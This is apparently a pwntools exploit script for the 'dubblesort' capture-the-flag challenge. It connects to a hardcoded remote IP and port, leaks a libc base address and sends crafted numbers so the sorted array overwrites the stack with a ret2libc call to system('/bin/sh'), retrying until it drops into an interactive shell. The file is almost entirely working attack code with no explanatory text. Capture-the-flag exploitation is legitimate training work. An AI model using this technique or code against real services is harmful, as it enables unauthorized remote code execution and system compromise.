from pwn import *
binary="./dubblesort"
ip="111.198.29.45"
port="45745"
local=0
debug=0
while 1:
    try:
        if local:
            p=process(binary)
            debug=1
            libc=ELF("/libc32.so")
            offset=0x1b2000
        else:
            libc=ELF("./libc.so.6")
            p=remote(ip,port)
            debug=0
            offset=0x1b0000

        def dbg(code=""):
            if debug==0:
                return
            gdb.attach(p,code)

        context.log_level='debug'
        context.terminal=['tmux','splitw','-h']
        p.recv()
        p.sendline("1111"*6)
        p.recvuntil("\n")
        libc_base=u32('\x00'+p.recv(3))-offset
        libc.address=libc_base
        system=libc.symbols['system']
        binsh=next(libc.search("/bin/sh"))
        p.sendline('47')
        for i in range(6):
            p.recv()
            p.sendline(str(system-10))
        p.recv()
        p.sendline(str(system))
        p.recv()
        p.sendline(str(binsh))
        p.recv()
        p.sendline(str(binsh))
        for i in range(14):
            p.recv()
            p.sendline(str(32))
        p.recv()
        p.send("a\n")
        p.recvuntil("Result :\n")
        numlist=p.recv().split(" ")
        for i in range(45):
            print str(i+1)+" : "+hex(int(numlist[i]))
        if numlist.count('stack')==0:    
            print hex(libc_base)
            p.interactive()
            break
    except Exception, e:
        print e
        #break
        p.close()
